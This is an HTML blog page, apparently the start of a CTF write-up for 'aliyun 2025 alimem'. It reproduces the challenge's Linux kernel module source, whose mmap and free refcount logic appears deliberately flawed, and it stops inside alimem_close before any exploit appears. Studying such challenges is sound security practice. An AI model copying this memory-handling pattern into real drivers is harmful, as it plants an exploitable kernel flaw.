@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>aliyun 2025 alimem</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./aliyun 2025 alimem.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">aliyun 2025 alimem</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-03-14]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="ti-mu">题目</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/module.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/kernel.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/fs.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/miscdevice.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/slab.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/uaccess.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/mm.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/rcupdate.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/rwsem.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/io.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/delay.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">MAX_PAGES </span><span style="color:#d08770;">64
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PAGE_ORDER </span><span style="color:#d08770;">0
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DEVICE_NAME &quot;</span><span style="color:#a3be8c;">alimem</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_ALLOC </span><span style="color:#d08770;">0x1337
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_FREE </span><span style="color:#d08770;">0x1338
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_WRITE </span><span style="color:#d08770;">0x1339
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_READ </span><span style="color:#d08770;">0x133a
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> already_open = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">alimem_page {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*virt;
+</span><span style="color:#c0c5ce;">    phys_addr_t phys;
+</span><span style="color:#c0c5ce;">    atomic_t refcount;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> rcu_head rcu;
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">alimem_write {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> offset;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">const char</span><span style="color:#c0c5ce;"> __user *data;
+</span><span style="color:#c0c5ce;">    size_t size;
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">alimem_read {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> offset;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> __user *data;
+</span><span style="color:#c0c5ce;">    size_t size;
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> alimem_page *pages[MAX_PAGES];
+</span><span style="color:#b48ead;">static </span><span style="color:#8fa1b3;">DECLARE_RWSEM</span><span style="color:#c0c5ce;">(pages_lock);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">free_page_rcu</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> rcu_head *</span><span style="color:#bf616a;">rcu</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page = </span><span style="color:#8fa1b3;">container_of</span><span style="color:#c0c5ce;">(rcu, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page, rcu);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">free_pages</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)page-&gt;virt, PAGE_ORDER);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(page);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">alimem_vma_close</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> vm_area_struct *</span><span style="color:#bf616a;">vma</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page = vma-&gt;vm_private_data;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">atomic_dec_and_test</span><span style="color:#c0c5ce;">(&amp;page-&gt;refcount)) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page-&gt;virt, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">call_rcu</span><span style="color:#c0c5ce;">(&amp;page-&gt;rcu, free_page_rcu);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">alimem_vma_open</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> vm_area_struct *</span><span style="color:#bf616a;">vma</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page = vma-&gt;vm_private_data;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">atomic_inc</span><span style="color:#c0c5ce;">(&amp;page-&gt;refcount);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static const struct</span><span style="color:#c0c5ce;"> vm_operations_struct alimem_vm_ops = {
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">open </span><span style="color:#c0c5ce;">= alimem_vma_open,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">close </span><span style="color:#c0c5ce;">= alimem_vma_close,
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">alimem_mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">filp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> vm_area_struct *</span><span style="color:#bf616a;">vma</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx = vma-&gt;vm_pgoff;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret = -EINVAL;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(idx &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| idx &gt;= MAX_PAGES) </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(vma-&gt;vm_end - vma-&gt;vm_start != PAGE_SIZE) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">rcu_read_lock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!pages[idx]) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    page = </span><span style="color:#8fa1b3;">rcu_dereference</span><span style="color:#c0c5ce;">(pages[idx]);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page) {
+</span><span style="color:#c0c5ce;">        phys_addr_t phys = page-&gt;phys;
+</span><span style="color:#c0c5ce;">        vma-&gt;vm_ops = &amp;alimem_vm_ops;
+</span><span style="color:#c0c5ce;">        vma-&gt;vm_private_data = page;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">vm_flags_set</span><span style="color:#c0c5ce;">(vma, vma-&gt;vm_flags | VM_DONTEXPAND | VM_DONTDUMP);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">remap_pfn_range</span><span style="color:#c0c5ce;">(vma, vma-&gt;vm_start, 
+</span><span style="color:#c0c5ce;">                          phys &gt;&gt; PAGE_SHIFT,
+</span><span style="color:#c0c5ce;">                          vma-&gt;vm_end - vma-&gt;vm_start,
+</span><span style="color:#c0c5ce;">                          vma-&gt;vm_page_prot)) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EAGAIN;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">atomic_inc</span><span style="color:#c0c5ce;">(&amp;page-&gt;refcount);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">alimem_ioctl</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">filp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx, ret = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *new_page;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(cmd) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> ALIMEM_ALLOC: {
+</span><span style="color:#c0c5ce;">        new_page = </span><span style="color:#8fa1b3;">kzalloc</span><span style="color:#c0c5ce;">(sizeof(*new_page), GFP_KERNEL);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!new_page) </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOMEM;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        new_page-&gt;virt = (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#8fa1b3;">__get_free_pages</span><span style="color:#c0c5ce;">(GFP_KERNEL, PAGE_ORDER);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!new_page-&gt;virt) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(new_page);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOMEM;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        new_page-&gt;phys = </span><span style="color:#8fa1b3;">virt_to_phys</span><span style="color:#c0c5ce;">(new_page-&gt;virt);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">atomic_set</span><span style="color:#c0c5ce;">(&amp;new_page-&gt;refcount, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">down_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(idx = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; idx &lt; MAX_PAGES; idx++) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!pages[idx]) {
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">rcu_assign_pointer</span><span style="color:#c0c5ce;">(pages[idx], new_page);
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">up_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> idx;
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">up_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">free_pages</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)new_page-&gt;virt, PAGE_ORDER);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(new_page);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOSPC;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> ALIMEM_FREE: {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *old;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">get_user</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> __user *)arg)) </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(idx &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| idx &gt;= MAX_PAGES) </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">down_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">        old = pages[idx];
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(old) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">rcu_assign_pointer</span><span style="color:#c0c5ce;">(pages[idx], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">atomic_dec_and_test</span><span style="color:#c0c5ce;">(&amp;old-&gt;refcount)) {
+</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(old-&gt;virt, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">call_rcu</span><span style="color:#c0c5ce;">(&amp;old-&gt;rcu, free_page_rcu);
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">up_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> ALIMEM_WRITE: {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_write wr;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(&amp;wr, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __user *)arg, sizeof(wr)))
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wr.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| wr.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">&gt;= MAX_PAGES || 
+</span><span style="color:#c0c5ce;">            wr.</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">+ wr.</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">&gt; PAGE_SIZE)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">rcu_read_lock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        page = </span><span style="color:#8fa1b3;">rcu_dereference</span><span style="color:#c0c5ce;">(pages[wr.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!page) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(page-&gt;virt + wr.</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, wr.</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, wr.</span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> ALIMEM_READ: {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_read rd;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(&amp;rd, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __user *)arg, sizeof(rd)))
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(rd.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| rd.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">&gt;= MAX_PAGES || 
+</span><span style="color:#c0c5ce;">            rd.</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">+ rd.</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">&gt; PAGE_SIZE)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">rcu_read_lock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        page = </span><span style="color:#8fa1b3;">rcu_dereference</span><span style="color:#c0c5ce;">(pages[rd.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!page) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_to_user</span><span style="color:#c0c5ce;">(rd.</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, page-&gt;virt + rd.</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, rd.</span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOTTY;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">alimem_open</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> inode *</span><span style="color:#bf616a;">inode</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(already_open)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EBUSY;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    already_open++;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pr_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">alimem: device open</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">alimem_close</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> inode *</span><span style="color:#bf616a;">inodep</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">filp</span><span style="color:#c0c5ce;">)
